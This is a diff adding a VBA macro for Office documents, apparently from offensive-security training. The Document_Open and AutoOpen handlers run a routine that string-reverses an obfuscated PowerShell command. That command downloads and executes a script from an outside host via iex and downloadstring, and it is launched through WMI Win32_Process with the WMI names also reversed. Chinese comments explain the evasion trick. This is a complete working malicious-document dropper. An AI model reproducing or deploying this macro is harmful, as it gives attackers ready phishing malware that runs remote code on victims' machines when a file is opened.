@@ -1,0 +1,21 @@
+Function bears(cows)
+    bears = StrReverse(cows)
+End Function
+ 
+Sub Mymacro()
+Dim strArg As String
+
+' 利用 https://codebeautify.org/reverse-string 实现 Payload 字符串倒序 : powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.XXX.XXX/run64.txt'))
+strArg = bears("))'txt.46nur/042.54.861.291//:ptth'(gnirtsdaolnwod.)tneilcbew.ten.metsys tcejbo-wen((xei c- pon- ssapyb cexe- llehsrewop")
+
+' 利用 https://codebeautify.org/reverse-string 实现 Payload 字符串倒序 : "winmgmts:" 以及 "Win32_Process"
+GetObject(bears(":stmgmniw")).Get(bears("ssecorP_23niW")).Create strArg, Null, Null, pid
+End Sub
+ 
+Sub Document_Open()
+    Mymacro
+End Sub
+ 
+Sub AutoOpen()
+    Mymacro
+End Sub
